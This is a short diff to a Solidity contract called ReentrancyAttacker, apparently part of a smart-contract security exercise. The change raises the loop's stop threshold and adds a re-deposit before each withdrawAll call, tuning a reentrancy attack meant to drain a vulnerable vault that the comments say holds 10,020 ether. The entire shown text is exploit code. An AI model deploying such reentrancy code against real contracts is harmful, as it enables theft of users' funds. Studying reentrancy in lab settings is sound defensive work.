@@ -18,9 +18,10 @@ contract ReentrancyAttacker {
         // You have 10 deposit balance.
         // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
 
-        if (address(this).balance > 99) return;
+        if (address(this).balance > 5_000) return;
 
         ISafeVault sv = ISafeVault(msg.sender);
+        sv.deposit{value: address(this).balance}();
         sv.withdrawAll(address(this));
     }
 }
